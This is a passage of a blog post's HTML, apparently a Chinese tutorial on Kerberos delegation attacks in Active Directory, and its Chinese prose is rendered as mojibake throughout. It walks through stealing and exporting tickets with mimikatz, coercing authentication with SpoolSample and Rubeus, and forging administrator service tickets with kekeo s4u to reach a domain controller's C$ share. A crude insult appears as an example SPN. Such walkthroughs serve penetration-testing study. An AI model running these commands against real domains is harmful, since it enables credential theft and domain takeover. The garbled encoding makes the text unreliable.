href="#å§”æ´¾æ”»å‡»" class="headerlink" title="å§”æ´¾æ”»å‡»"></a>å§”æ´¾æ”»å‡»</h2><h3 id="åŸŸå§”æ´¾"><a href="#åŸŸå§”æ´¾" class="headerlink" title="åŸŸå§”æ´¾"></a>åŸŸå§”æ´¾</h3><p>åŸŸå§”æ´¾æ˜¯ä¸€ç§åŸŸå†…ä¸»æœºçš„è¡Œä¸ºï¼Œä½¿æŸä¸ªæœåŠ¡å¯ä»¥ä»¥è®¿é—®çš„ç”¨æˆ·çš„èº«ä»½å»è®¿é—®å¦å¤–ä¸€ä¸ªæœåŠ¡ã€‚<br>ä¸ºä»€ä¹ˆéœ€è¦åŸŸå§”æ´¾å‘¢ï¼Œæ¯”å¦‚ç°åœ¨æœ‰webæœåŠ¡å™¨å’Œæ–‡ä»¶æœåŠ¡å™¨ï¼Œå½“ç”¨æˆ·Aè®¿é—®webæœåŠ¡å™¨å»è¯·æ±‚æŸä¸ªèµ„æºæ—¶ï¼ŒwebæœåŠ¡å™¨ä¸Šæœ¬èº«å¹¶æ²¡æœ‰è¯¥èµ„æºï¼Œæ‰€ä»¥webæœåŠ¡å™¨å°±ä¼šä»æ–‡ä»¶æœåŠ¡å™¨ä¸Šè°ƒç”¨è¿™ä¸ªèµ„æºï¼Œå…¶ä¸­å‘ç”Ÿçš„è¿‡ç¨‹è‹¥ä»¥åŸŸå§”æ´¾çš„å½¢å¼è¿›è¡Œï¼Œé‚£ä¹ˆå°±æ˜¯ï¼š<br>ç”¨æˆ·Aè®¿é—®webæœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å†ä»¥ç”¨æˆ·Açš„èº«ä»½å»è®¿é—®æ–‡ä»¶æœåŠ¡å™¨ã€‚<br>å‘ç”ŸåŸŸå§”æ´¾çš„æœåŠ¡ä¸€èˆ¬ä¸ºæœºå™¨è´¦æˆ·å’ŒæœåŠ¡è´¦æˆ·ã€‚<br>åŸŸå§”æ´¾åˆ†ä¸ºä¸‰ç§ï¼šéçº¦æŸæ€§å§”æ´¾ï¼Œçº¦æŸæ€§å§”æ´¾ï¼ŒåŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾</p><h4 id="éçº¦æŸæ€§å§”æ´¾"><a href="#éçº¦æŸæ€§å§”æ´¾" class="headerlink" title="éçº¦æŸæ€§å§”æ´¾"></a>éçº¦æŸæ€§å§”æ´¾</h4><p>éçº¦æŸæ€§å§”æ´¾çš„åŸç†æ˜¯ï¼šç”¨æˆ·æƒ³è®¿é—®æœåŠ¡Aï¼Œäºæ˜¯å‘KDCæäº¤è®¤è¯ï¼ŒKDCå‘ç°Aæ˜¯éçº¦æŸæ€§å§”æ´¾ï¼Œäºæ˜¯ä¼šæŠŠTGTæ”¾åœ¨STä¸­ä¸€å¹¶ç»™ç”¨æˆ·ã€‚ç„¶åç”¨æˆ·ç”¨è¿™ä¸ªSTå»è®¿é—®æœåŠ¡Aï¼ŒæœåŠ¡Aå°±ç›¸å½“äºè·å¾—äº†ç”¨æˆ·çš„TGTï¼ŒæŠŠTGTæ”¾å…¥lsassè¿›ç¨‹ï¼Œç„¶åå°±å¯ä»¥æ‹¿ç€ç”¨æˆ·çš„TGTä»¥ç”¨æˆ·çš„èº«ä»½å»è®¿é—®æ‰€æœ‰ç”¨æˆ·æƒé™èƒ½å¤Ÿè®¿é—®çš„æœåŠ¡äº†ã€‚</p><p>éçº¦æŸæ€§å§”æ´¾çš„å¯ç”¨ï¼š</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134709.png" alt="QQæˆªå›¾20210217134709"></p><p>ä¸ºæŸè´¦æˆ·å¯ç”¨ ä¿¡ä»»æ­¤è®¡ç®—æœºæ¥å§”æ´¾ä»»ä½•æœåŠ¡ å³å¼€å¯éçº¦æŸæ€§å§”æ´¾ã€‚<br>å¼€å¯ååœ¨è¯¥ç”¨æˆ·çš„ ACLå±æ€§ä¼šå¤šå‡ºä¸€ä¸ª flag : WORKSTATION_TRUSTED_FOR_DELEGATION (å›¾æˆªä¸å®Œï¼Œåæ­£è¿™ä¸ªflagå°±åœ¨ç®­å¤´æ‰€æŒ‡å¤„çš„åé¢)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134749.png" alt="QQæˆªå›¾20210217134749"></p><p>éçº¦æŸå§”æ´¾çš„è®¾ç½®éœ€è¦<code>SeEnableDelegation</code> ç‰¹æƒï¼Œè¯¥ç‰¹æƒé€šå¸¸ä»…æˆäºˆåŸŸç®¡ç†å‘˜<br>è¿™é‡Œè¯´ä¸ªé¢˜å¤–è¯ï¼ŒåŸŸæ§ä¸»æœºé»˜è®¤æ˜¯éçº¦æŸæ€§å§”æ´¾</p><h4 id="çº¦æŸæ€§å§”æ´¾"><a href="#çº¦æŸæ€§å§”æ´¾" class="headerlink" title="çº¦æŸæ€§å§”æ´¾"></a>çº¦æŸæ€§å§”æ´¾</h4><p>éçº¦æŸæ€§å§”æ´¾æ˜¯å¾ˆä¸å®‰å…¨çš„ï¼ˆå› ä¸ºæ§åˆ¶äº†å¼€å¯éçº¦æŸæ€§å§”æ´¾çš„æœºå™¨ï¼Œå°±ç›¸å½“äºè·å¾—äº†ä¸Šé¢çš„æ‰€æœ‰å…¶ä»–ç”¨æˆ·çš„TGTï¼‰ï¼Œæ‰€ä»¥æ›´å®‰å…¨çš„çº¦æŸæ€§å§”æ´¾è¯ç”Ÿäº†ã€‚<br>çº¦æŸæ€§å§”æ´¾å¤šäº†ä¸¤ä¸ªå§”æ´¾åè®®ï¼ŒS4U2SELF S4U2PROXYï¼Œå¹¶ä¸”é™åˆ¶äº†è¢«è®¾ç½®å§”æ´¾çš„æœåŠ¡çš„è®¿é—®èŒƒå›´ï¼šä»…èƒ½è¢«å§”æ´¾åˆ°è¢«æŒ‡å®šçš„æœåŠ¡ã€‚</p><p>çº¦æŸæ€§å§”æ´¾çš„å¤§è‡´æµç¨‹ï¼š<br>ç”¨æˆ·è®¿é—®å¼€å¯çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡A<br>ï¼ˆæƒ…å†µä¸€ï¼šæ— S4U2SELFå‚ä¸ï¼‰é¦–å…ˆéœ€è¦ç»è¿‡KDCè®¤è¯ï¼ŒKDCå‘ç°æœåŠ¡Aå¼€å¯äº†çº¦æŸæ€§å§”æ´¾ï¼Œäºæ˜¯åœ¨TGS_RESè¿”å›ç»™ç”¨æˆ·ST1ï¼ˆå¯è½¬å‘STï¼‰ï¼Œç”¨æˆ·æ‹¿ç€ST1è®¿é—®æœåŠ¡Aï¼ŒæœåŠ¡Aå…ˆä¸KDCè¿›è¡Œèº«ä»½éªŒè¯è·å¾—ä¸€ä¸ªæœ‰æ•ˆTGTï¼Œç„¶åæ‹¿ç€ST1ç»è¿‡S4U2PROXYåè®®å‘KDCå‘èµ·TGS_REQï¼ŒKDCè¿”å›ST2ï¼ˆç”¨æˆ·èº«ä»½çš„STï¼‰ï¼Œç„¶åæœåŠ¡Aæ‹¿ç€ST2è®¿é—®æŒ‡å®šæœåŠ¡ã€‚<br>ï¼ˆæƒ…å†µäºŒï¼šæœ‰S4U2SELFå‚ä¸ï¼‰ç”¨æˆ·é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå¦‚NTLMè®¤è¯ï¼Œè¡¨å•è®¤è¯ç­‰ï¼‰è·å–äº†æœåŠ¡Açš„ä¿¡ä»»ï¼Œä½†æ˜¯æ­¤æ—¶æœåŠ¡Aå¹¶æ²¡æœ‰æ¥è‡ªç”¨æˆ·çš„ST1ï¼ŒæŒ‰æƒ…å†µä¸€ä¸­çš„æµç¨‹ï¼ŒæœåŠ¡Aå°±ä¸èƒ½å®Œæˆå§”æ´¾ã€‚æ‰€ä»¥è¿™ä¸ªæ—¶å€™æœåŠ¡Aä¼šä»¥è‡ªå·±çš„èº«ä»½å‘KDCå‘èµ·ç”³è¯·è·å–ä¸€ä¸ªå¯è½¬å‘TGTï¼ˆè·å–KDCä¿¡ä»»ï¼‰ï¼Œç„¶åç”¨è¿™ä¸ªTGTå‘èµ·TGS_REQè·å¾—æŒ‡å®šç”¨æˆ·çš„ST1ï¼Œæ—¢ç„¶è·å–äº†ST1ï¼Œå°±ç»§ç»­æƒ…å†µä¸€ä¸­çš„æµç¨‹å³å¯äº†ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´S4U2SELFæ˜¯ç”¨æˆ·é€šè¿‡ékerberosåè®®å®Œæˆè®¤è¯çš„æƒ…å†µä¸‹ï¼Œè‡ªåŠ¨å‘KDCè·å–ST1çš„ä¸€ä¸ªåè®®ã€‚<br>è€ŒS4U2PROXYåˆ™æ˜¯å°†ST1å‘ç»™KDCï¼Œä½¿å…¶å˜ç°ä¸ºæˆè‡ªå·±å¯ç”¨çš„ ST2 çš„ä¸€ä¸ªåè®®ã€‚</p><p>å¯ç”¨æ–¹æ³•:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135048.png" alt="QQæˆªå›¾20210217135048"></p><p>å…¶ä¸­è¢«æ·»åŠ çš„æœåŠ¡åˆ™æ˜¯å…è®¸è¢«å§”æ´¾åˆ°çš„æœåŠ¡</p><p>è‹¥å¯ç”¨çš„æ˜¯ ä»…ä½¿ç”¨kerberosï¼Œé‚£ä¹ˆuseraccountcontrolå±æ€§ä»…æœ‰ workstation_trust_account.<br>è‹¥å¯ç”¨ä»»ä½•èº«ä»½éªŒè¯åè®®ï¼Œå°±ä¼šæœ‰ TrustedToAuthenticationForDelegation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135100.png" alt="QQæˆªå›¾20210217135100"></p><h4 id="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾</h4><p>Windows Server 2012ä¸­å¼•å…¥äº†åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚ åªèƒ½åœ¨è¿è¡ŒWindows Server 2012æˆ–Windows Server 2012 R2åŠä»¥ä¸Šçš„åŸŸæ§åˆ¶å™¨ä¸Šé…ç½®<br>åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ï¼Œä¸éœ€è¦åŸŸç®¡ç†å‘˜å‰æ¥è®¾ç½®ï¼Œè€ŒæŠŠè®¾ç½®å§”æ´¾çš„æƒé™äº¤ç»™äº†è‡ªèº«ã€‚<br>å…¶å®å°±æ˜¯å¯ä»¥æ‘†è„±åŸŸæ§æ¥ä¸»åŠ¨è®¾ç½®è‡ªå·±å¯ä»¥è¢«å“ªäº›è´¦æˆ·å§”æ´¾è®¿é—®ã€‚</p><h3 id="éçº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#éçº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="éçº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>éçº¦æŸæ€§å§”æ´¾æ”»å‡»</h3><p>éçº¦æŸæ€§å§”æ´¾æœ‰å·¨å¤§çš„å®‰å…¨é—®é¢˜ï¼Œä¸Šé¢æˆ‘ä»¬è¯´è¿‡ï¼Œéçº¦æŸæ€§å§”æ´¾çš„å®è´¨å°±æ˜¯æŠŠç”¨æˆ·çš„TGTå­˜å…¥lassaè¿›ç¨‹ï¼Œä»è€Œæ¨¡æ‹Ÿç”¨æˆ·èº«ä»½è¿›è¡Œå„ç§å§”æ´¾è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€æ§åˆ¶éçº¦æŸæ€§å§”æ´¾æ”»å‡»çš„æœºå™¨ï¼Œç„¶ådumpå‡ºæ‰€æœ‰çš„ç¥¨æ®ï¼Œå°±ç›¸å½“äºè·å¾—äº†æ‰€æœ‰ç»è¿‡è¯¥æœåŠ¡è¿›è¡Œçº¦æŸæ€§å§”æ´¾çš„ç”¨æˆ·çš„èº«ä»½äº†ã€‚</p><h4 id="1-è¿›è¡Œéçº¦æŸæ€§å§”æ´¾è´¦æˆ·æ‰«æ"><a href="#1-è¿›è¡Œéçº¦æŸæ€§å§”æ´¾è´¦æˆ·æ‰«æ" class="headerlink" title="1.è¿›è¡Œéçº¦æŸæ€§å§”æ´¾è´¦æˆ·æ‰«æ"></a>1.è¿›è¡Œéçº¦æŸæ€§å§”æ´¾è´¦æˆ·æ‰«æ</h4><p>è¿™é‡Œæä¸€ä¸‹æ€ä¹ˆåˆ›å»ºæœ‰SPNçš„æœåŠ¡è´¦æˆ·ã€‚<br>åªéœ€å†åŸŸæ§é‡Œæ‰§è¡Œ setspn -U -A spn_type username å³å¯<br>å…¶ä¸­spn_typeå³SPNçš„æ ¼å¼ï¼š MSSQLSvc/<FQDN>:[<port> | <instancename>]</p><ul><li><strong>MSSQLSvc</strong> æ˜¯è¦æ³¨å†Œçš„æœåŠ¡ã€‚</li><li><FQDN> æ˜¯æœåŠ¡å™¨çš„å®Œå…¨é™å®šåŸŸåã€‚</li><li><port> æ˜¯ TCP ç«¯å£å·ã€‚</li><li><instancename> æ˜¯ SQL Server å®ä¾‹çš„åç§°ã€‚</li></ul><p>è¿™é‡Œæˆ‘ä»¬éšä¾¿è¾“ä¸€ä¸ªï¼Œæ¯”å¦‚ sb/caonima è¿™ç§éƒ½è¡Œ.</p><p>è¿™é‡Œé‡‡ç”¨powersploitä¸‹çš„powerview.ps1<br>æ ¹æ®æˆ‘ç½‘ä¸Šå¾ˆå¤šæœç´¢ç»“æœï¼ŒæŸ¥æ‰¾éçº¦æŸå§”æ´¾æœåŠ¡è´¦æˆ·åªéœ€è°ƒç”¨<br><code>Get-NetUser -Unconstrained -Domain de1ay.com</code><br>è¿™ä¸ªå‘½ä»¤å³å¯ï¼Œä½†æ˜¯æˆ‘ä¸‹è½½ä¸‹æ¥çš„powerviewé‡Œçš„get-netuseré‡Œå´æ²¡æœ‰unconstrainedå‚æ•°ï¼Œå¾ˆçƒ¦ã€‚æ‰€ä»¥ç”¨ä¸€ä¸ªæ¯”è¾ƒåŸå§‹çš„æ–¹æ³•æ¥åˆ¤åˆ«ï¼ˆé€‚åˆåœ¨ç”¨æˆ·å°‘çš„æƒ…å†µä¸‹ï¼‰<br>ç›´æ¥è°ƒç”¨ Get-NetUser -SPN æ‰¾åˆ°æ‰€æœ‰æœåŠ¡è´¦æˆ·æˆ–è€…Get-domaincomputeræ‰¾åˆ°æ‰€æœ‰æœºå™¨è´¦æˆ·ï¼Œç„¶ååˆ¤æ–­å…¶useraccountcontrlé‡Œæœ‰æ²¡æœ‰trusted_for_delegation,è‹¥æœ‰ï¼Œåˆ™è¯´æ˜å¼€å¯äº†éçº¦æŸæ€§å§”æ´¾</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135123.png" alt="QQæˆªå›¾20210217135123"></p><p>æŸ¥è¯¢éçº¦æŸå§”æ´¾æœºå™¨è´¦æˆ·åˆ™ç”¨<br><code>Get-domaincomputer -unconstrained -domain const.com</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135236.png" alt="QQæˆªå›¾20210217135236"></p><h4 id="2-éçº¦æŸæ€§å§”æ´¾çš„æ”»å‡»"><a href="#2-éçº¦æŸæ€§å§”æ´¾çš„æ”»å‡»" class="headerlink" title="2.éçº¦æŸæ€§å§”æ´¾çš„æ”»å‡»"></a>2.éçº¦æŸæ€§å§”æ´¾çš„æ”»å‡»</h4><p>ä»…èƒ½åŸºäºæœºå™¨è´¦æˆ·</p><p>å¦‚æœæˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªéçº¦æŸæ€§å§”æ´¾è´¦æˆ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ”¶é›†å†…å­˜ä¸­çš„tgtè¾¾åˆ°ä»»æ„ç”¨æˆ·è®¿é—®çš„ç›®çš„ã€‚</p><p>åœ¨è¢«æ§åˆ¶çš„éçº¦æŸæ€§å§”æ´¾æœºå™¨ä¸Šä½¿ç”¨mimikatzã€‚<br><code>privilege::debug</code>ææƒ<br><code>sekurlsa::tickets</code> æŸ¥çœ‹æœ¬æœºæ‰€æœ‰ç¥¨æ®</p><p>é€šè¿‡ä»¥ä¸Šå‘½ä»¤è·å–ç¥¨æ®,å¦‚æœç®¡ç†å‘˜è®¿é—®äº†æœ¬æœºçš„ä¸€äº›æœåŠ¡ï¼Œé‚£ä¹ˆå®ƒçš„TGTå°±ä¼šè¢«æˆªè·æ”¾å…¥å†…å­˜ã€‚</p><p>æˆ‘ä»¬æ¨¡æ‹Ÿç®¡ç†å‘˜è°ƒç”¨éçº¦æŸæ€§å§”æ´¾æœºçš„smbæœåŠ¡</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135342.png" alt="QQæˆªå›¾20210217135342"></p><p>æˆ‘ä»¬å›åˆ°éçº¦æŸå§”æ´¾æœºï¼ŒæŸ¥çœ‹ç¥¨æ®</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135358.png" alt="QQæˆªå›¾20210217135358"></p><p>tgtè¢«æˆªè·,æˆ‘ä»¬ç”¨ sekurlas::tickets /export æŠŠç¥¨æ®å¯¼å‡ºæ¥</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135408.png" alt="QQæˆªå›¾20210217135408"></p><p>ç„¶åmimikatzé‡Œä½¿ç”¨<br><code>kerberos::ptt ç¥¨æ®æ–‡ä»¶å å°†ç¥¨æ®æ³¨å…¥å†…å­˜</code><br>è®¿é—®åŸŸæ§c$</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135419.png" alt="QQæˆªå›¾20210217135419"></p><p>æˆåŠŸ</p><h4 id="3-éçº¦æŸæ€§å§”æ´¾é…åˆ-Spooleræ‰“å°æœºæœåŠ¡"><a href="#3-éçº¦æŸæ€§å§”æ´¾é…åˆ-Spooleræ‰“å°æœºæœåŠ¡" class="headerlink" title="3.éçº¦æŸæ€§å§”æ´¾é…åˆ Spooleræ‰“å°æœºæœåŠ¡"></a>3.éçº¦æŸæ€§å§”æ´¾é…åˆ Spooleræ‰“å°æœºæœåŠ¡</h4><p>çº¯éçº¦æŸæ€§å§”æ´¾æ”»å‡»å¾ˆé¸¡è‚‹ï¼Œå› ä¸ºå¿…é¡»è¦å…¶ä»–ç”¨æˆ·é€šè¿‡ä½ è¿›è¡Œå§”æ´¾è®¿é—®ã€‚<br>ä½†æ˜¯ ï¼šåˆ©ç”¨Windowsæ‰“å°ç³»ç»Ÿè¿œç¨‹åè®®<code>ï¼ˆMS-RPRNï¼‰</code>ä¸­çš„ä¸€ç§æ—§çš„ä½†æ˜¯é»˜è®¤å¯ç”¨çš„æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ï¼ŒåŸŸç”¨æˆ·å¯ä»¥ä½¿ç”¨MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotificationï¼ˆExï¼‰</code>æ–¹æ³•å¼ºåˆ¶ä»»ä½•è¿è¡Œäº†<code>Spooler</code>æœåŠ¡çš„è®¡ç®—æœºä»¥é€šè¿‡<code>Kerberos</code>æˆ–<code>NTLM</code>å¯¹æ”»å‡»è€…é€‰æ‹©çš„ç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ã€‚ é…åˆéçº¦æŸæ€§å§”æ´¾æ”»å‡»ï¼Œç®€ç›´çˆ†ç‚¸ï¼Œå¯ä»¥ä¸»åŠ¨æ‹¿åˆ°å…¶ä»–ç”¨æˆ·çš„TGTã€‚-<br>è€Œä¸”splooeræœåŠ¡æ˜¯é»˜è®¤è¿è¡Œçš„ã€‚ï¼ˆå›¾æºWIN7ï¼‰</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135445.png" alt="QQæˆªå›¾20210217135445"></p><p>ä½¿å…¶ä»–ä¸»æœºå¼ºè¡Œä¸è‡ªå·±å‘ç”Ÿèº«ä»½éªŒè¯çš„è„šæœ¬ï¼šéœ€è¦è‡ªå·±ç¼–è¯‘ä¸€ä¸‹<a href="https://github.com/leechristensen/SpoolSample.git">https://github.com/leechristensen/SpoolSample.git</a></p><p>åœ¨æ­¤ä¹‹å‰éœ€è¦å¼€å¯ç›‘å¬æ¥è‡ªå…¶ä»–ä¸»æœºçš„TGTï¼Œè¿™é‡Œç”¨çš„æ˜¯rubeus<br><code>Rubeus.exe monitor /interval:1 /filteruser:xx</code></p><p>ç„¶åä½¿ç”¨<code>SpoolSample.exe XX win7</code>,è®©æŒ‡å®šæœºå™¨è®¿é—®WIN7è¿›è¡Œèº«ä»½éªŒè¯</p><p>ç„¶åè·å¾—TGTï¼Œä¸‹ç­ã€‚</p><h3 id="çº¦æŸæ€§å§”æ´¾çš„æ”»å‡»"><a href="#çº¦æŸæ€§å§”æ´¾çš„æ”»å‡»" class="headerlink" title="çº¦æŸæ€§å§”æ´¾çš„æ”»å‡»"></a>çº¦æŸæ€§å§”æ´¾çš„æ”»å‡»</h3><p>çº¦æŸæ€§å§”æ´¾çš„å¤§è‡´æ”»å‡»æµç¨‹æ˜¯: (åˆ©ç”¨S4U2SELF=&gt;)å¦‚æœæˆ‘ä»¬è·å¾—äº†çº¦æŸæ€§å§”æ´¾æœºçš„NTLM hashæˆ–è€…æ˜æ–‡å¯†ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»¥æ­¤æ¥å‘KDCå‘é€ä¸€ä¸ªTGTç”³è¯·ï¼Œè·å¾—ä¸€ä¸ªå¯è½¬å‘çš„TGTã€‚ç„¶åç”¨è¿™ä¸ªå¯è½¬å‘çš„TGTè°ƒç”¨S4U2SELFåè®®ï¼Œè·å¾—ä¸€ä¸ªé’ˆå¯¹è‡ªå·±çš„ST1ç¥¨æ®ï¼ˆå…¶ä¸­ST1ç¥¨æ®ä¸­çš„è¯·æ±‚ç”¨æˆ·å¯ä»¥ä»»æ„ä¼ªé€ ï¼‰.ç„¶åç”¨è¿™ä¸ªST1ç¥¨æ®å»å‘KDCè¯·æ±‚ST2ï¼Œç„¶åç”¨ST2å»è®¿é—®æœåŠ¡ï¼Œæ­¤æ—¶æˆ‘ä»¬è®¿é—®çš„èº«ä»½å°±æ˜¯æˆ‘ä»¬ä»»æ„ä¼ªé€ çš„èº«ä»½äº†.</p><p>é‡ç‚¹æ˜¯åªè¦è·å¾—äº†å¯è½¬å‘TGTï¼Œçº¦æŸæ€§å§”æ´¾æœºå°±å¯ä»¥ä»»æ„ä¼ªé€ å…¶ä»–ç”¨æˆ·çš„ST1ç¥¨æ®è¯·æ±‚ï¼Œå¤ªå¯æ€•äº†ã€‚</p><p>è¿™ä¸ªæ”»å‡»çš„æœ€å¤§å‰ææ˜¯æˆ‘ä»¬å¾—è·å¾—çº¦æŸæ€§å§”æ´¾è´¦æˆ·çš„NTLM HASHæˆ–è€…æ˜æ–‡å¯†ç ,ç„¶åæˆ‘ä»¬æ‰èƒ½æˆåŠŸçš„å¾—åˆ°å¯è½¬å‘TGTï¼Œç„¶åæ‰èƒ½å¾—åˆ°æ¥ä¸‹æ¥çš„ä¸€åˆ‡ã€‚</p><p>é¦–å…ˆé…ç½®å¥½çº¦æŸæ€§å§”æ´¾è´¦æˆ·</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135527.png" alt="QQæˆªå›¾20210217135527"></p><p>æ³¨æ„é€‰ç”¨ ä½¿ç”¨ä»»ä½•èº«ä»½éªŒè¯åè®®</p><p>æˆ‘ä»¬å…ˆä¿¡æ¯æœé›†ï¼šçœ‹å“ªäº›ç”¨æˆ·æ˜¯å¼€å¯çº¦æŸæ€§å§”æ´¾çš„ã€‚ä¸€æ‰‹powerviewå®‰æ’ä¸Š</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135553.png" alt="QQæˆªå›¾20210217135553"></p><p>ç®­å¤´æŒ‡å‡ºçš„åœ°æ–¹å°±æ˜¯å¯ä»¥è¢«å§”æ´¾è®¿é—®çš„æœåŠ¡</p><p>æˆ‘ä»¬ç”¨kekeoæ¥å®ç°æ”»å‡».</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:xx &#x2F;domain:xx &#x2F;password:xx &#x2F;ticket:test.kirbiè¿™é‡Œçš„&#x2F;passwordå¯ä»¥æ”¹æˆ&#x2F;NTLM:xx</span><br><span class="line">è·å¾—TGTè½¬å‘ç¥¨æ®</span><br><span class="line"></span><br><span class="line">tgs::s4u &#x2F;tgt:file_name &#x2F;user:administrator &#x2F;service:cifs&#x2F;DC</span><br><span class="line">tgtå¤„æ”¹ä¸ºåˆšåˆšå¾—åˆ°çš„TGTæ–‡ä»¶çš„åå­—ï¼Œè¿™ä¸ªå‘½ä»¤æ‰§è¡Œåå¾—åˆ°administratorèº«ä»½çš„ ST2</span><br></pre></td></tr></table></figure><p>æŠŠæœ€åè·å¾—çš„ç¥¨æ®ç”¨mimikatz kerberos::ptt æ³¨å…¥å†…å­˜ï¼Œå®Œäº‹ã€‚</p><h3 id="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾-1"><a href="#åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾-1" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾</h3><p>refer:<a href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p><h4 id="åŸç†çš„å‡ ä¸ªç‚¹ï¼š"><a href="#åŸç†çš„å‡ ä¸ªç‚¹ï¼š" class="headerlink" title="åŸç†çš„å‡ ä¸ªç‚¹ï¼š"></a>åŸç†çš„å‡ ä¸ªç‚¹ï¼š</h4><p>1.S4U2SELF åè®®å¯ä»¥åœ¨ç”¨æˆ·æ²¡æœ‰é…ç½® TrustedToAuthenticationForDelegation å±æ€§ï¼ˆå³å¼€å¯ä½¿ç”¨ä»»ä½•åè®®è®¤è¯çš„çº¦æŸæ€§å§”æ´¾ï¼‰æ—¶è¢«è°ƒç”¨ï¼Œä½†æ˜¯è¿”å›çš„STæ˜¯ä¸å¯è¢«è½¬å‘çš„ã€‚<br>2.åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä¸»æœº åœ¨è¢«å¦ä¸€å°ä¸»æœºå§”æ´¾è®¿é—®æ—¶ï¼Œåœ¨S4U2PROXYè¿‡ç¨‹ä¸­æäº¤è¿‡æ¥çš„STå¦‚æœå³ä½¿æ˜¯ä¸å¯è½¬å‘çš„ã€‚KDCä¾æ—§ä¼šè¿”å›æœ‰æ•ˆçš„ST2ã€‚<br>3.æ¯ä¸ªæ™®é€šåŸŸç”¨æˆ·é»˜è®¤å¯ä»¥åˆ›å»ºè‡³å¤šåä¸ªæœºå™¨è´¦æˆ·ï¼ˆ ç”±MachineAccountQuotaå±æ€§å†³å®š ï¼‰ï¼Œæ¯ä¸ªæœºå™¨è´¦æˆ·è¢«åˆ›å»ºæ—¶éƒ½ä¼šè‡ªåŠ¨æ³¨å†ŒSPN: <code>RestrictedKrbHost/domain</code>å’Œ<code>HOST/domain</code>è¿™ä¸¤ä¸ªSPN</p><h4 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹:"></a>æ”»å‡»æµç¨‹:</h4><p>å‡è®¾å¼€å¯åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æœºå™¨ä¸ºA<br>1.é¦–å…ˆè¦æœ‰ä¸€ä¸ªå¯¹å½“å‰è®¡ç®—æœºæœ‰å†™æƒé™çš„è´¦æˆ·ï¼Œæ‰èƒ½å¯¹Aè®¾ç½®å¯ä»¥ è¢« å§”æ´¾è®¿é—®çš„æœåŠ¡è´¦æˆ·ã€‚<br>2.åˆ©ç”¨å½“å‰è´¦æˆ·åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¹¶é…ç½®å¥½æœºå™¨è´¦æˆ·åˆ°Açš„ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾<br>3.å› ä¸ºæœºå™¨è´¦æˆ·æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„å¯†ç è´¦æˆ·ï¼Œå¯ä»¥è®©å®ƒåˆ©ç”¨S4U2SELFåè®®è·å¾—ä¸€ä¸ªä¸å¯è½¬å‘STã€‚ç„¶åç”¨è¿™ä¸ªä¸å¯è½¬å‘STé€šè¿‡S4U2PROXYï¼Œåœ¨åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾åŸºç¡€ä¸Šè·å¾—æœ‰æ•ˆçš„è®¿é—®A cifsæœåŠ¡çš„ST2ã€‚<br>4.ç”¨ST2è®¿é—®Açš„CIFSæœåŠ¡ï¼Œæƒé™è·å¾—ã€‚</p><h4 id="å®æ“"><a href="#å®æ“" class="headerlink" 